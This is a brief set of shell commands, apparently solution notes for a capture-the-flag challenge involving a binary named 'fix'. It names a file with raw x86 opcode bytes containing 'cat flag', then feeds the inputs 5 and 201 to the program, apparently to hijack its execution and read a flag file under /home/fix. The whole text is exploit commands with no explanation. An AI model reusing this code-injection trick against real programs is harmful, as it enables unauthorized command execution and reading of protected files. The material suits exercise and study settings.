
echo 'cat flag' > `python -c "print '\x83\xc4\x10\x83\xec\x0c\x50\xe8\xe3\x6f\x01'"`

./fix < 5 201

echo 'cat /home/fix/flag' > `python -c "print '\x83\xc4\x10\x83\xec\x0c\x50\xe8\x8d\x63\x01'"`
/home/fix/fix (ingresar 5 y 201)
